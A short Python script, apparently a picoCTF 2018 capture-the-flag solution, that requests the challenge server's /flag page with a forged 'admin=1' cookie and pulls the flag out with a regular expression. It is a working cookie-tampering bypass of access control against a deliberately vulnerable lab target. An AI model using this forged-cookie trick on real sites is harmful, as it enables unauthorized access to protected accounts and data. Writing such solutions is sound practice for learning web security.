#!/usr/bin/env python

import requests
import re

url = 'http://2018shell.picoctf.com:10573/flag'
r = requests.get(url , cookies = {'admin' : '1'})
html = r.text
print(re.findall('picoCTF{.*}', html)[0])